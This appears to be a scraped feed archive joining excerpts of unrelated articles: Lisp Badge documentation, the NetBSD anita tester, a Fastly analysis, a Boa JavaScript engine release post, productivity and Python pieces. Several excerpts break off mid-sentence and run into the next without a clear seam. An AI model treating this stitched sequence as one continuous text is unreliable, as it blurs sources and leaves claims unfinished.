<p>I will no doubt keep an eye on Gemini, and serving my blog posts to Gemini should be easy since they are already in markdown. No promises yet though.</p>
<p>I will leave you with the following quote and some interesting links I found.</p>
<blockquote>
<p>"When I picture it in my head I think of the early web as more of a library. Over time it has transitioned into a shopping mall." - chris_f (Hacker News comments)</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>People tend to read scores and scores of articles in pursuit of “how to build a successful business”. </p><p>At the high level, I think it’s really simple.</p><p>Building a successful business is based on 3 strong foundational pillars.</p><h2>Pillar 1</h2><p><strong>Solve a real problem for a large enough group of people</strong></p><p>You can find a real problem by observing people’s behaviour. Do they say “I wish I could do X” or do they actively invest time, effort, and hacks to be able to do X. The latter means there’s a real problem to be solved.</p><p>The next step is to be sure you aren’t solving a problem faced by 1, or just 10 people in the world. You want the universe of people who need the same problem solved to be big enough to satisfy your aspirations and build a real business.</p><h2>Pillar 2</h2><p><strong>Find a way to get your solution in front of those people</strong></p><p>Once you have a real problem that needs to be solved, figure out how to distribute it before you start writing a single line of code. </p><p>Solving a real problem isn’t enough. </p><p>If you have a brilliant pill that takes away headaches, but nobody knows about it, you don’t have a business. </p><p>You need to find a way to distribute the solution to the right audience. </p><p>This could be through blogging, direct email, joining forums and Facebook groups where your audience gathers, ranking for a search term on Google, sponsoring a newsletter sent out to your target customers.</p><p>Don’t know where your customers gather? Just ask a few of them what they did when they faced the problem (did they search on Google?). Or ask them what publications or groups or other internet properties they visit regularly.</p><h2>Pillar 3</h2><p><strong>Hustle</strong></p><p>No rocket science here. A real problem and a means to distribution are great, but you got to be in for the grind. </p><p>Try and understand what the hustle means to you. To me, it gives my life meaning. I love to hustle and find ways to move forward with my business. I never feel like it’s a chore. This is a mindset, you can adopt it too. </p><p>It is easier to adopt this mindset if you enjoy the problem you’re solving the things you have to do to distribute the solution, and if you like the customers you are serving.</p><p>Everything else, like good UI/UX, customer support, brand, logo, etc. can be figured out. But those are built on top of a foundation that is the 3 pillars.</p><figure id="w-node-2f4b74473414-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5edce7dab088801155f6fa86_3%20pillars%20article%20image.png" alt=""></p></figure></div><div><h3>✉️ Enjoyed reading?</h3><p>Join Sunday Coffee ☕️, my weekly newsletter that goes out on Sundays (surprise!). </p><p>I'll send links to my posts for the week, and interesting links that I gather from the internet about living a good life, and building SaaS businesses.</p></div><p>In case the subscribe form isn't loading on your device, you can subscribe directly on <a href="https://tinyletter.com/hipreetam93" target="_blank">Tiny Newsletter</a>.</p></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

<p>The Lisp Badge is a self-contained computer with its own display and keyboard, based on an ATmega1284, that you can program in uLisp:</p>
<p><img src="http://www.ulisp.com/pictures/3j/lispbadgehand.jpg" alt="LispBadgeHand.jpg" width="720" height="462"></p>
<p>You can use it to run programs that interface to components such as LEDs and push-buttons via the I/O pins, read the analogue inputs, and operate external devices via the I2C and SPI interfaces. It has a greyscale OLED display that gives 8 lines of 42 characters, and an integrated 45-key keyboard optimised for Lisp.</p>
<p>For details of how to build one see&nbsp;<a href="http://www.technoblogy.com/show?2AEE" target="_blank">Lisp Badge</a>&nbsp;on Technoblogy.</p>

<p><strong>Display</strong>: 42 characters x 8 lines.</p>
<p><strong>Keyboard:</strong>&nbsp;Integrated 45-key keyboard providing upper and lower-case characters, digits, and the symbols required by uLisp.</p>
<p><strong>Memory available</strong>: 2816 Lisp cells (11264 bytes).</p>
<p><strong>EEPROM</strong>: 1024 Lisp cells (4096 bytes), allows you to save the Lisp workspace using <strong>save-image</strong>.</p>
<p><strong>Processor:</strong> ATmega1284P</p>
<p><strong>Clock speed:</strong> 16 MHz.</p>
<p><strong>Current consumption:</strong> Approx. 20 mA.</p>

<p>The language includes two extensions, <strong>plot</strong> and <strong>plot3d</strong>, for plotting graphs and 3d functions.&nbsp;</p>
<p><strong>Types supported</strong>: list, symbol, integer, character, string, and stream.</p>
<p>An integer is a sequence of digits, optionally prefixed with "+" or "-". Integers can be between -32768 and 32767. You can enter numbers in hexadecimal, octal, or binary with the notations #x2A, #o52, or #b101010, all of which represent 42.</p>
<p>User-defined symbol names can have arbitrary names. Any sequence that isn't an integer can be used as a symbol; so, for example, 12a is a valid symbol.</p>
<p>There is one namespace for functions and variables; in other words, you cannot use the same name for a function and a variable.</p>
<p>Includes a mark and sweep garbage collector. Garbage collection takes 5 msec.</p>
<h4><strong>Interfaces</strong></h4>
<p>These interfaces are brought to headers at the edge of the Lisp Badge board. The numbers in brackets refer to Arduino pin numbers:</p>
<ul>
<li>Four analogue input pins using <strong>analogread</strong>: A0 to A3 (24 to 27) plus VCC and GND.</li>
<li>Two analogue outputs using <strong>analogwrite</strong>:&nbsp;MISO (6), and SCK (7).</li>
<li>Digital input and output using <strong>pinmode</strong>, <strong>digitalread</strong>, and <strong>digitalwrite</strong>:&nbsp;MOSI (5), MISO (6), SCK (7),&nbsp;RX0 (8), TX0 (9), SCL (16), SDA (17), and A0 to A3 (24 to 27)</li>
<li>I2C interface using <strong>with-i2c</strong> and <strong>restart-i2c</strong>: SCL (16) and SDA (17).</li>
<li>SPI interface using <strong>with-spi</strong>: MOSI (5), MISO (6), and SCK (7).</li>
<li>Serial interface (FTDI) using&nbsp;<strong>with-serial</strong>: RX0 (8) and TX0 (9).</li>
</ul>
<p>The shift key can be used as a digital input: SHIFT (23).</p>
<p>SCK (7) is connected to an LED on the front panel. This is an analogue output pin, so you can vary the brightness of the LED.</p>
<h3>Plotting extensions</h3>
<p>The Lisp Badge contains two plotting extensions, plot and plot3d, designed to allow plotting to the greyscale graphics display.</p>
<p><span>After generating a plot both functions wait for the ESC key to be pressed before displaying the uLisp prompt.</span></p>
<h3 id="plot">plot&nbsp;<span>function</span></h3>
<p><strong>Syntax:</strong>&nbsp;<code>(plot [<em>x-intercept y-intercept</em>] [<em>function</em>]...)</code></p>
<p>Plots up to four functions on the same graph, optionally with axes.</p>
<p>Each function should be a function of one parameter, the x coordinate, and it will be called with each value of x from 0 to 255. The function should return the y value, from 0 to 63.</p>
<p>If&nbsp;<em>x-intercept</em>&nbsp;and&nbsp;<em>y-intercept</em>&nbsp;are specified,&nbsp;<strong>plot3d</strong>&nbsp;draws axes through those intercepts.</p>
<p>For example, defining:</p>
<pre>(defun sine ()
  (let ((x 0) (y 2045))
    (lambda (n) 
      n
      (incf x (/ (* y 16) 163))
      (decf y (/ (* x 16) 163))
    (+ 32 (ash x -6)))))</pre>
<p>the following command:</p>
<pre>(plot 0 32 (sine))</pre>
<p>will plot:</p>
<p><img src="http://www.ulisp.com/pictures/3j/lispsine.jpg" alt="LispSine.jpg" width="600" height="211"></p>
<h4 id="plot3d">Plotting multiple functions</h4>
<p>The following example plots the voltages on the analogue inputs 0 to 3 once a second on a single plot. First define:</p>
<pre>(defun adc (n) (lambda (x) (delay 250) (/ (analogread n) 8)))</pre>
<p>Then give the command:</p>
<pre>(plot 0 0 (adc 0) (adc 1) (adc 2) (adc 3))</pre>
<h3>plot3d&nbsp;<span>function</span></h3>
<p><strong>Syntax:</strong>&nbsp;<code>(plot3d&nbsp;[<em>x-intercept y-intercept</em>] [<em>function</em>])</code></p>
<p>The function should be a function of two parameters, the x and y coordinates, and it will be called with each value of x from 0 to 255 and y from 0 to 63. The function should return the greyscale value to be plotted, from 0 to 15.</p>
<p>If&nbsp;<em>x-intercept</em>&nbsp;and&nbsp;<em>y-intercept</em>&nbsp;are specified,&nbsp;<strong>plot3d</strong>&nbsp;draws axes through those intercepts.</p>
<p>For example, defining:</p>
<pre>(defun p (x y) 
  (let ((a (/ (- x 128) 2))
        (b (- y 32))) 
    (min (abs (- (logand (/ (+ (* a a) (* b b) (* a b)) 16) 31) 15)) 15)))</pre>
<p>the following command:</p>
<pre>(plot3d 128 32 p)</pre>
<p>will plot:</p>

<br/>
July 3, 2020 | https://www.gson.org/netbsd/anita/ | <a href="https://web.archive.org/web/*/https://www.gson.org/netbsd/anita/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">


<p>Anita is a tool for automated testing of
the <a href="http://www.netbsd.org/">NetBSD</a> operating
system.  Using anita, you can download a NetBSD
distribution and install it in a
virtual machine in a fully
automated fashion.  It's fun to watch, and it has helped find
a large number of bugs in NetBSD, as well as several bugs in
qemu and other emulators.</p>

The virtual machine anita installs into is typically based
on <a href="https://www.qemu.org/">qemu</a>, but the
i386 and amd64 ports of NetBSD can also be installed in a
<a href="http://www.xen.org/">Xen</a> domU, and some of
the more exotic NetBSD ports use gxemul or simh.

<p>For example, the following command will download, install, and boot
NetBSD/i386 6.1.5 in a qemu virtual machine, and leave you at the login 
prompt:
</p>

<pre>   anita interact http://ftp.netbsd.org/pub/NetBSD/NetBSD-6.1.5/i386/
</pre>

<p>The main focus of anita is on testing the <i>sysinst</i>
installation procedure and quickly detecting regressions that cause
the system to fail to install or boot, but anita is now also finding
use as a platform for testing the whole NetBSD system by running the 
ATF test suite.  Output from
periodic anita tests of NetBSD-current on multiple architectures
can be found on the
<a href="http://releng.netbsd.org/test-results.html">NetBSD release engineering web pages</a>.
</p><p>Anita is written in <a href="http://www.python.org/">Python</a>
and uses the
<a href="http://pexpect.sourceforge.net/pexpect.html">pexpect</a> module
to "screen scrape" the sysinst output over an emulated serial console
and script the installation procedure.</p>

<p>The set of NetBSD ports supported by anita is growing,
and currently includes the following:
<a href="http://www.netbsd.org/Ports/i386/">i386</a>,
<a href="http://www.netbsd.org/Ports/amd64/">amd64</a>,
<a href="http://www.netbsd.org/Ports/sparc/">sparc</a>,
<a href="http://www.netbsd.org/Ports/pmax/">pmax</a>,
<a href="http://www.netbsd.org/Ports/hpcmips/">hpcmips</a>,
<a href="http://www.netbsd.org/Ports/evbarm/">evbarm-earmv7hf</a>,
<a href="http://www.netbsd.org/Ports/evbarm/">evbarm-aarch64</a>,
and
<a href="http://www.netbsd.org/Ports/vax/">vax</a>.
If you know how to manually install some
other NetBSD port in an emulator using a serial console,
please send a full typescript of the terminal session 
to the anita author so that support for that port can be
added to anita.
</p><p>
Anita fully supports cross-installation setups where
the machine running anita is a different architecture
from the virtual machine being installed on.  Anita
has also been successfully used to cross-install
NetBSD in virtual machines hosted on operating
systems other than NetBSD itself, including
FreeBSD, Linux, and Mac OS X.
</p>

<p>Here's an animated screenshot of Anita 1.2 installing and booting NetBSD 4.0RC3:</p>

</p>



<p>For more information, see the <i>anita(1)</i> man page in the latest
anita distribution.</p>

<p>Anita can be installed via <a href="http://www.pkgsrc.org/">pkgsrc</a>
as <i>misc/py-anita</i>.  Releases can also be downloaded manually
<a href="https://www.gson.org/netbsd/anita/download/">here</a>, and the source repository is

<p>Fastly (FSLY) has experienced an incredible run over the past several weeks.  The share price has more than doubled since <a aria-label="undefined (opens in a new tab)" href="https://softwarestackinvesting.com/fastly-fsly-q1-2020-earnings-results-review/" target="_blank" rel="noreferrer noopener nofollow">releasing</a> Q1 earnings on May 6.  This can be primarily attributed to the major increase in guidance for Q2 and the rest of the year.  There have been other surprises as well, like the <a aria-label="undefined (opens in a new tab)" href="https://www.streamingmediablog.com/2020/05/fastly-amazon-homepage.html" target="_blank" rel="noreferrer noopener nofollow">observation</a> that Amazon.com has been using Fastly POPs for content delivery.  A lot of investor excitement is also pinned on the upcoming release of <a aria-label="undefined (opens in a new tab)" href="https://www.fastly.com/products/edge-compute/serverless" target="_blank" rel="noreferrer noopener nofollow">Compute@Edge</a>, which represents a significant extension of Fastly’s current CDN offerings.  Since the product is in beta, it isn’t clear how sizable the revenue impact will be.  Given this, I thought it would be worth spending some time examining how Fastly has approached building new technologies in the past and what this might mean for their future edge compute offering.  I also wanted to share my understanding of the technical underpinnings of the platform and how these differ from other serverless offerings currently on the market.  Whether Fastly’s surge represents a one-time COVID-19 driven bump or they will sustain long-term usage growth remains to be seen.  With this information, investors can decide for themselves if the Fastly story is hype or their edge compute platform represents the beginning of something fundamentally disruptive.</p>



<h3>Fastly’s Roots and Bad CDNs</h3>



<p>Since its founding, there has been something different about Fastly’s mind set.  The Fastly team has a trait ingrained in their DNA to address hard technical problems with innovative and often more difficult solutions, with the goal to create a better experience for their customers.  This was applied to the CDN business originally and is now manifesting in the design of a fast, compact, secure, globally distributed serverless compute platform.  </p>



<p>Fastly was founded by Artur Bergman in 2011, directly as a consequence of his frustration with using existing CDN solutions as the CTO of <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Fandom_(website)" target="_blank" rel="noreferrer noopener nofollow">Wikia</a>, a popular hosting service for wikis.  At the time, CDN offerings were dominated by entrenched players like Akamai (AKAM), Limelight (LLNW) and even emerging CDN products from cloud vendors, such as <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Amazon_CloudFront" target="_blank" rel="noreferrer noopener nofollow">Amazon Cloudfront</a>.  As the story goes, Artur became frustrated with the capabilities of CDNs around 2010.  He complained about needing technical support to make any adjustments to his CDN configuration and long delays while changes rolled out. Existing solutions lacked programmability, a trait highly valued by the engineering teams who were increasingly getting pulled into discussions about application performance and uptime through the DevOps movement.  With a strong hands-on technical background, Artur decided that he could build a better solution and did so.   </p>



<p>Out of this Fastly was born, with an intent to find better ways to enable modern software engineering organizations to optimize the delivery of their internet applications.  This was grounded in an avoidance of the status quo and the easy path.  Fastly’s Chief Product Architect recently <a aria-label="undefined (opens in a new tab)" href="https://www.fastly.com/blog/why-edge-compute-does-not-yet-support-javascript" target="_blank" rel="noreferrer noopener nofollow">said</a> “Fastly has a long history of looking at problems from first principles and being unafraid to undertake difficult projects if we know they will benefit our customers.”  This approach reminds of <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Eric_Yuan" target="_blank" rel="noreferrer noopener nofollow">Eric Yuan</a> at Zoom Video (ZM) and his journey to build a better video conferencing solution.  At the time in 2011, it would have been easy to question why Eric thought he could improve on existing video conferencing offerings from <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Cisco_Webex" target="_blank" rel="noreferrer noopener nofollow">WebEx</a> and <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Skype" target="_blank" rel="noreferrer noopener nofollow">Skype</a>, in what many would consider a largely commoditized space.  Yet, Zoom’s success can be attributed to a highly focused and passionate drive to deliver an incrementally better experience for their users.  I posit that Fastly is doing the same for content delivery and distributed compute infrastructure with a laser focus on what is better for the developer.</p>



<h3>Applied to Network Design</h3>



<p>While Fastly was initially getting off the ground as a cash-strapped start-up, they applied this approach to the design of their content delivery network. They could have taken the common path of deploying network and server hardware in a standard configuration at many POPs across the globe.  To route traffic across the internet, they could have purchased expensive off the shelf routers.  However, the team stepped back, examined the problems they were trying to solve and designed a <a aria-label="undefined (opens in a new tab)" href="https://vimeo.com/132842124" target="_blank" rel="noreferrer noopener nofollow">different approach</a> to their content delivery network.  It didn’t hurt that they needed to preserve cash, which pushed the team towards addressing common functionality with their own custom software modules versus commercial products.  This software-driven design has paid dividends many times over, giving the team the flexibility to evolve their network design as content delivery use cases change.</p>



<p>As the first problem, the Fastly team <a aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://www.fastly.com/blog/building-and-scaling-fastly-network-part-1-fighting-fib" target="_blank">examined</a> approaches to handling networking traffic into and out of their POPs.  The standard configuration was to purchase border routers that can store the entire <a aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Border_Gateway_Protocol" target="_blank">internet routing table</a> in memory space.  Switches were less expensive, but didn’t offer the memory or compute necessary to handle full internet routing.  In 2013, <a aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Arista_Networks" target="_blank">Arista Networks</a> began selling a switch that allowed users to run their own software on it.  This provided the best solution for the Fastly team.  They proceeded to write their own distributed routing agent, called Silverton, which orchestrates route configuration within Fastly POPs.  Silverton peers with the <a aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Border_Gateway_Protocol" target="_blank">BGP</a> daemon, <a aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Bird_Internet_routing_daemon" target="_blank">BIRD</a>, which interfaces with the outside internet.  This combination allows Fastly’s customized switches to function as a more expensive border router, saving hundreds of thousands of dollars for every POP they deployed.  Also, it pushes external routing logic down to the host level, reducing load on the switches and providing more fine-grained control over traffic routing per user request.  By custom designing Silverton, the Fastly team has full control over routing management within the POP, allowing them to push network path selection to the application level and achieve far greater control over network behavior.  This has been subsequently iterated upon to selectively override route selection for certain types of content and use cases, resulting in better content delivery performance than existing solutions that generally apply a single routing rule at the border router to all cases.</p>



<figure><img src="https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-Network-Diagram.png" alt="" srcset="https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-Network-Diagram.png 749w, https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-Network-Diagram-300x157.png 300w, https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-Network-Diagram-676x354.png 676w" sizes="(max-width: 749px) 100vw, 749px"><figcaption>Fastly Custom Edge Router Logical Diagram</figcaption></figure>



<p>As the next problem, the Fastly team examined the assumption that having many small POPs geographically dispersed across the globe results in the best overall delivery times for user content.  This was the approach taken by other legacy CDNs who had invested in hundreds or thousands of small POPs, spread down to the city level.  This “strength in numbers” philosophy is still presented as an advantage today by legacy players, as it is easy to make the argument that more POPs are better for performance.  Actually, this is not generally the case, as the amount of content that can be cached at each small POP is limited.  So, a significant percentage of user requests will need to be sent back to the origin servers, which will increase access times for those requests by a factor of 10x or more.  For example, if the cache miss percentage increases by just 10%, it could raise overall average access times by 50% or more.  Fastly realized that having fewer POPs with much more storage space would actually result in faster average delivery times.  In a <a aria-label="undefined (opens in a new tab)" href="https://www.fastly.com/blog/why-having-more-pops-isnt-always-better" target="_blank" rel="noreferrer noopener nofollow">blog post</a> from 2016, one of Fastly’s co-founders gave the analogy of convenient stores versus supermarkets.  While a convenience store is generally closer to a person’s home, it has a limited set of items for sale.  If the person drives a few more miles to the supermarket, they could get all of their groceries in one trip.  In this case, convenience stores represent the approach taken by the legacy CDN’s with many local POPs and the supermarkets represent Fastly’s approach with fewer, larger ones.  </p>



<figure><img src="https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-POPs-1024x522.png" alt="" srcset="https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-POPs-1024x522.png 1024w, https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-POPs-300x153.png 300w, https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-POPs-768x391.png 768w, https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-POPs-676x344.png 676w, https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-POPs.png 1533w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Building and Scaling the Fastly Network, Fastly Altitude, 2015</figcaption></figure>



<p>This is why Fastly still has a limited number of POPs across the globe (<a href="https://investors.fastly.com/news/news-details/2020/Fastly-Achieves-100-Tbps-of-Edge-Capacity-Milestone/default.aspx" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">72 total</a> as of June), versus thousands advertised by competitors.  Fastly POPs are thoughtfully placed at network crossroads, where they provide proximity to geographic regions, but have the storage capacity to enable much higher hit ratios for user requests. </p>

<p>Additionally, Fastly <a aria-label="undefined (opens in a new tab)" href="https://www.fastly.com/blog/how-our-solid-state-drives-result-cost-savings-customers" target="_blank" rel="noreferrer noopener nofollow">chose to utilize SSDs</a> (relatively new at the time) to store the cached data.  <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Solid-state_drive" target="_blank" rel="noreferrer noopener nofollow">SSDs</a> are more expensive than standard disks, but offer much faster retrieval times, on par with RAM.  Based on Fastly’s research, a typical hard drive could perform approximately&nbsp;450 IOPS when reading and 300-400 IOPS when writing (in a test with 4kb files).  The SSDs Fastly uses, however, execute somewhere in the region of 75,000 IOPS reading and 11,500 when writing. Making this design choice further contributed to reducing Fastly’s average response times, by making data retrieval within the POPs super fast (furthering the supermarket analogy, like having all your groceries sitting at the front door).  At the time, each server in a POP had 384 GB of RAM, and 6 TB of SSD space (made up from 12x 500 GB drives), and each CPU has 25 MB of L3 cache.  A typical POP had 32 machines spec’ed like this.  </p>



<p>But Fastly didn’t stop there.  They also wrote a custom storage engine for their POP servers to bypass the file system and squeeze every last drop of performance out of the SSDs, cramming as much data on them as possible.  They employ various algorithms to keep commonly used data in the 384 GB of RAM, making it even faster.  For some assets, such as “Like” or “Share” buttons that never change and are requested millions of times a second, they go even further by serving them out of the L3 cache directly from the processor.  </p>

    <p>Hello World!</p>

<p>Boa is an experimental Javascript lexer, parser and compiler written in Rust. It has support for some of the language, can be embedded in Rust projects fairly easily and also used from the command line.<br>
Boa also exists to serve as a Rust implementation of the EcmaScript specification, there will be areas where we can utilise Rust and its fantastic ecosystem to make a fast, concurrent and safe engine.</p>

<p>Today we’re pleased to announce our latest release, version 0.9.<br>
v0.9 is by far the biggest release we’ve had since Boa began. You can find the full changes from the <a href="https://github.com/boa-dev/boa/blob/master/CHANGELOG.md#-090-2020-06-25---move-to-organisation-78-faster-execution-time">changelog</a>. The milestone behind this version was further optimisation and an increase in new features. We can show you how we can identify areas that can be optimised.</p>



<p>Boa became the first Rust project to make use of <a href="https://github.com/rust-lang/measureme">measureme</a>, a profiling tool built from the ground up for Rust. This was only used by the Rust team themselves to profile the compiler. We managed to work with the compiler team to get the framework in a good enough state to be used by other projects too, and in this release, we gave it a try.</p>

<p>Measure me lets you profile various areas of your choosing, then you can generate a trace file which can be loaded into Chromium or various other tools for analysis.
We took it for a spin (which you’ll see in Object Specialization).</p>

<p>Below is an example of our trace, this is using a measureme tool called <code>summarize</code></p>

<div><div><pre><code>+----------------------------+-----------+-----------------+----------+------------+
| Item                       | Self time | % of total time | Time     | Item count |

+----------------------------+-----------+-----------------+----------+------------+
| create_instrinsics         | 263.50µs  | 3.756           | 6.38ms   | 1          |
+----------------------------+-----------+-----------------+----------+------------+
| make_builtin_fn: toString  | 218.50µs  | 3.114           | 290.50µs | 12         |
+----------------------------+-----------+-----------------+----------+------------+
| String                     | 81.60µs   | 1.163           | 961.60µs | 1          |
+----------------------------+-----------+-----------------+----------+------------+
</code></pre></div></div>

<p>You can read more about Rust’s usage of measureme <a href="https://blog.rust-lang.org/inside-rust/2020/02/25/intro-rustc-self-profile.html">here</a>.</p>

<h2 id="object-specialization">Object Specialization</h2>

<p>In JavaScript internal metadata for objects are stored in <code>internal slots</code>. In Boa we stored internal slots as a hashmap tied to the object, with the keys being strings and the values as <a href="https://github.com/boa-dev/boa/blob/73f65f7800917c92f86134eaa21751c1ca93d986/boa/src/builtins/value/mod.rs#L57-L78"><code>JSValues</code></a>. This meant we needed to constantly unwrap them into a Rust primitive to access the data. Secondly we were restricted as to what type of data we could put in internal slots. For example, lets say we want to implement <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set"><code>Set</code></a> by using the native <a href="https://doc.rust-lang.org/std/collections/struct.HashSet.html"><code>HashSet</code></a> as a backing store, this would not be possible.</p>

<p>By changing how internal data is handled for some of our builtin objects and removing a whole bunch of redundant access checks, we managed to speed up the interpreter.</p>

<p>Boa would spend a significant amount of time converting back and forth between JS Values and primitive values. We found a huge amount of time was spent in <code>Value::set_field</code> before any code had even been executed. <code>set_field</code> was slow due to the amount of updating of internal slots as part of setting up. Here you can see realm creation takes roughly 60ms (dev build).</p>

<p><em>We use <a href="https://github.com/rust-lang/measureme/blob/master/crox/Readme.md">Crox</a> to convert our measureme data into a format Chrome’s performance tab understands</em></p>

<p><img src="https://boa-dev.github.io/images/2020-07-03/before.png" alt="Before"></p>

<p>We refactored many builtins to hold an <code>ObjectData</code> enum variant instead, some of which can hold a value for the type also.
This can be used to both identify objects and to use their internal data.<br>
Here is an example of our enum.</p>

<div><div><pre><code><span>/// Defines the different types of objects.</span>
<span>#[derive(Debug,</span> <span>Trace,</span> <span>Finalize,</span> <span>Clone)]</span>
<span>pub</span> <span>enum</span> <span>ObjectData</span> <span>{</span>
    <span>Array</span><span>,</span>
    <span>BigInt</span><span>(</span><span>RcBigInt</span><span>),</span>
    <span>Boolean</span><span>(</span><span>bool</span><span>),</span>
    <span>Function</span><span>(</span><span>Function</span><span>),</span>
    <span>String</span><span>(</span><span>RcString</span><span>),</span>
    <span>Number</span><span>(</span><span>f64</span><span>),</span>
    <span>Symbol</span><span>(</span><span>RcSymbol</span><span>),</span>
    <span>Error</span><span>,</span>
    <span>Ordinary</span><span>,</span>
<span>}</span>
</code></pre></div></div>

<p><img src="https://boa-dev.github.io/images/2020-07-03/after.png" alt="After"></p>

<p>This gave us a 70% speedup and reduced startup time by well over half. The <code>realm::create</code> function now runs in 13ms instead of 60ms.</p>

<h2 id="optimised-type-comparisons">Optimised Type Comparisons</h2>

<p>If you’ve ever called <code>typeof</code> in JavaScript, you get a string value describing the primitive type of it’s argument. Boa was doing the same internally for comparing (using the “get_type()” call), however getting the string value from each primitive then comparing them is not very performant.<br>
Now, thanks to @Lan2u we have a rust <a href="https://github.com/boa-dev/boa/blob/8f8498eac17164c8de2f599bd0b7ba2e8053ec30/boa/src/builtins/value/val_type.rs#L4-L17"><code>Type</code></a> enum which makes comparing more efficient and on average brings another 8% performance boost.</p>

<h2 id="jsvalue-refactor">JSValue Refactor</h2>

<p>We have completely refactored how JavaScript values are stored.<br>
<a href="https://github.com/boa-dev/boa/pull/498">#498</a> makes values more lightweight by only GC’ing objects and not the primitives. The primitive scalar values are just Rust primitives which implement the Copy trait, so the overhead of moving these around is much lower.<br>
By decoupling our <code>Value</code> types and <code>GC</code> types we have brought our <code>Value</code> size from 40 bytes =&gt; 24 bytes and an 80% reduction in arithmetic operations!</p>

<h2 id="parser-rebuild-better-code-organisation">Parser rebuild, better code organisation</h2>

<p>Boa was predominantly 3 files. The lexer, parser and interpreter.<br>
The naive implementation of the parser was a <a href="https://github.com/boa-dev/boa/blob/c23a7b1f4ac57af6c5f0b9f6c98fbbed7a14c98f/src/lib/syntax/parser.rs">single file</a> which had a long match expression for tokens and went through every token figuring out what to do. This did the job but became unmaintainable when adding new features.<br>
We have been breaking the parser up into separate modules, which represent various expressions and statements that conform to the specification. (more about this in a future post).</p>

<p>After all the fixes in this release we’ve seen on average a 70% improvement, we still have areas where we plan to improve. We are currently rebuilding the lexer so it is more broken up like the parser and interpreter, we will blog about this soon in future.</p>

<h2 id="roadmap">Roadmap</h2>

<h3 id="how-much-of-the-specification-is-covered"><em>How much of the specification is covered?</em></h3>

<p>Our next milestone is to tidy up the lexer so it takes into account <a href="https://tc39.es/ecma262/#sec-context-free-grammars"><code>goal symbols</code></a> then we plan to start running Test 262, the official ECMAScript Test Suite. It has a lot of tests (over 29272 test files) and will tell us in detail which parts of the specification need work.<br>
There are also large items like classes which are still not covered, however, these should now be easier to implement with parsing broken up.</p>

<h3 id="public-api"><em>Public API</em></h3>

<p><a href="https://github.com/boa-dev/boa/issues/445">#445</a> looks to improve the public API too so Rust projects can interactive with Boa more easily.<br>
It should be possible today to just use the lexer, parser or the whole execution path.</p>

<p>We hope to add more detail in future on how some parts of Boa work, make sure you stay tuned for any future posts!</p>

                        <p>Ironically I'm writing this post as procrastiwork, since I don't feel like doing anything that's actually <em>on</em> my to-do list.</p><p>The template will probably seem obvious, but that's kinda the point. You don't need any fancy programs —&nbsp;currently I use Apple Notes; previously Google Docs. Nor do you need to read any books about productivity.</p><p>Of course, if kanban or whatever the kids are into these days is what works for you, then do that! I've learned that I won't stick with any system that isn't exactly this basic and flexible. Something like <a href="https://fortelabs.co/blog/para/">Tiago Forte's PARA</a> is amazing, but too much for me to handle.</p><p>Anyway, the template has three main sections: Now, Soon, and Later. The exact labels can and should change — I usually do something along the lines of Today, Next Few Weeks, and To-Be-Scheduled. Currently what I've got on deck is Today plus two Later sections:</p><figure><img src="https://www.sonyasupposedly.com/content/images/2020/07/Screen-Shot-2020-07-03-at-4.43.23-PM.png" alt="" srcset="https://www.sonyasupposedly.com/content/images/size/w600/2020/07/Screen-Shot-2020-07-03-at-4.43.23-PM.png 600w, https://www.sonyasupposedly.com/content/images/2020/07/Screen-Shot-2020-07-03-at-4.43.23-PM.png 838w" sizes="(min-width: 720px) 720px"><figcaption>Sorry for the messy redaction. Btw, I don't promise to do exactly these things in exactly this order.</figcaption></figure><p>I also stick a monthly log on the end, honestly more for the satisfaction of collecting done items than anything else.</p><p>Usually I have way more Later to deal with — when tasks start to pile up I'll make a separate project-specific list, or a standalone To-Be-Scheduled list, and then get rid of it again once I've worked through the backlog.</p><p>That should give you the idea 😊 Like I said, ultra simple! Here's the template for copy-pasting:</p><h3 id="now">Now</h3><ul><li>item</li><li>item</li><li>item</li></ul><h3 id="soon">Soon</h3><ul><li>item</li><li>item</li><li>item</li></ul><h3 id="later">Later</h3><ul><li>item</li><li>item</li><li>item</li></ul>

</ul><p>Imagine a custom <em>set-like</em> data structure that doesn’t perform hashing and trades performance for tighter memory footprint. Or imagine a <em>dict-like</em> data structure that automatically stores data in a PostgreSQL or Redis database the moment you initialize it; also it lets you to <em>get-set-delete</em> key-value pairs using the usual <em>retrieval-assignment-deletion</em> syntax associated with built-in dictionaries. Custom data structures can give you the power of choice and writing them will make you understand how the built-in data structures in Python are constructed.</p>

<p>One way to understand how built-in objects like dictionary, list, set etc work is to build custom data structures based on them. Python provides several mixin classes in the <code>collection.abc</code> module to design custom data structures that look and act like built-in structures with additional functionalities baked in.</p>

